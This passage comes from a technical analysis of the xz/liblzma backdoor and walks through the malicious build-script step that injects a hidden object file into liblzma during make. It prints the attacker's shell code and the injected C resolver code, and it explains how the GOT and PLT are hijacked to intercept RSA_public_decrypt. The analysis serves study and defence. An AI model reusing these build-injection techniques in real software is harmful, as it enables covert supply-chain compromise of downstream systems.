”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
This
if
statement is running a pipeline of sed commands piped into
$CC
with the arguments
liblzma_la-crc64-fast.o
(adding that object as an input to the compiler) and
-x
c
-
(compile a C program from standard input). That is, it rebuilds an edited copy of
crc64_fast.c
(a real xz source file) and merges the extracted malicious
.o
file into the resulting object, overwriting the underscored real object file that would have been built originally for
crc64_fast.c
. The
sed
1i
tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?
The file starts out looking like:
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}
The sed commands add an
_
prefix to the name of the function in the return condition, and then add
$V
after the
include
line, producing (with reformatting of the C code):
# 0 "path/to/src/liblzma/check/crc64_fast.c"
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif

#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && \
    defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && \
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))

extern int _get_cpuid(int, void*, void*, void*, void*, void*);

static inline bool _is_arch_extension_supported(void) {
    int success = 1;
    uint32_t r[4];
    success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19);
    return success && (r[2] & ecx_mask) == ecx_mask;
}

#else
#define _is_arch_extension_supported is_arch_extension_supported
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return _is_arch_extension_supported()
            ? &crc64_arch_optimized : &crc64_generic;
}
That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted
_is_arch_extension_supported
, which calls
_get_cpuid
. This still looks like plausible code, since this is pretty similar to
the real is_arch_extension_supported
. But
_get_cpuid
is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA_public_decrypt.
But let’s get back to the shell script, which is still running from inside
src/liblzma/Makefile
and just successfully inserted the backdoor into
.libs/liblzma_la-crc64_fast.o
. We are now in the
if
compiler success case:
cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
This does the same thing for
crc32_fast.c
, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested
if
compiler success case:
eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
If we can relink the .la file, then...
if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
If the relink succeeded but didn’t write the file, assume it failed and restore the backups.
rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
No matter what, remove the libraries. (The
Makefile
link step is presumably going to happen next and recreate them.)
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
This is the
else
for the link failing. Restore from backups.
rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true
Now we are in the inner compiler success case. Delete backups.
else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
This is the else for the crc32 compilation failing. Restore from backups.
else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)
rm -f liblzma_la-crc64-fast.o || true
Now we are at the end of the Makefile section of the script. Delete the backup.
fi
eval $DHLd
$
Close the “
elif
we’re in a Makefile”, one more extension point/debug print, and we’re done!
The script has injected the object file into the objects built during
make
, leaving no trace behind.
